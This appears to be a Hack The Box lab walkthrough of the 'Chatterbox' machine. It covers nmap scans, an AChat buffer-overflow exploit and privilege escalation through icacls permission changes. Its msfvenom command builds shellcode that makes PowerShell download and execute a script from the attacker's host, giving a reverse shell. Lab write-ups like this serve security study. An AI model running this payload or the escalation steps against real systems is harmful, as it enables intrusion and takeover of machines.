<img src="Pasted image 20240722182121.png" alt="HTB Profile Image" class="htb-profile-img">

<style>
  .htb-profile-img {
    width: 100%;
    max-width: 800px;
    border-radius: 8px;
    box-shadow: 0 0 10px rgba(0, 255, 0, 0.8); /* Initial glow effect */
    transition: box-shadow 0.3s ease-in-out, transform 0.3s ease-in-out; /* Smooth transition for glow and zoom effects */
  }

  .htb-profile-img:hover {
    box-shadow: 0 0 20px rgba(0, 255, 0, 1); /* Enhanced glow on hover */
    transform: scale(1.05); /* Zoom effect on hover */
  }
</style>


**Ping**
![[Pasted image 20240629131330.png]]

Nmap Scans
```
mapit 10.10.10.74
```

Nmap Default Scan
![[Pasted image 20240629131450.png]]

Nmap Service and Script Scan
![[Pasted image 20240629131630.png]]
![[Pasted image 20240629131723.png]]

Nmap All Port Scan
![[Pasted image 20240629131809.png]]

Service and Script Scan for the new ports
```
nmap 10.10.10.74 -p 9255,9256 -sV -sC  -A
```
![[Pasted image 20240629140310.png]]

This system might be vulnerable to Eternal blue, because  it is running **windows 7 professional 7601** will try this.

Eternal blue didn't work, will go with AChat on Port 9256

Exploit code:https://github.com/mpgn/AChat-Reverse-TCP-Exploit

First will generate a shellcode using MsfVenom
```
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.2/rev.ps1')" -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python > shellcode
```
![[Pasted image 20240702114750.png]]

Will update the shell code in the python exploit code AChat_Exploit.py
![[Pasted image 20240702114829.png]]

Also we need to update the server ip in the exploit code AChat_Exploit.py
![[Pasted image 20240702114902.png]]

Will Jump to Initial Foothold.....!

Now will run the exploit
```
python2 AChat_Exploit.py
```
![[Pasted image 20240702115011.png]]

I have already hosted my python web server and started Netcat listener
Got Reverse Shell
![[Pasted image 20240702115126.png]]
Got a Shell as Alfred
![[Pasted image 20240702115206.png]]

User.txt
![[Pasted image 20240702115617.png]]



Will Jump to Privilege Escalation.....!

We can list the content of the Admins directory, but can't read root.txt
![[Pasted image 20240702120357.png]]

Will check our Permissions on the Admin's desktop
![[Pasted image 20240702120443.png]]
We have full access, that means we can change permissions of the files that are in Desktop

As of now only admin as access
![[Pasted image 20240702120635.png]]

Will grant full access on root.txt to Alfred
```
icacls root.txt /grant alfred:F
```
![[Pasted image 20240702120951.png]]

Now We can read the root.txt
![[Pasted image 20240702121045.png]]





Done With Chatterbox......:)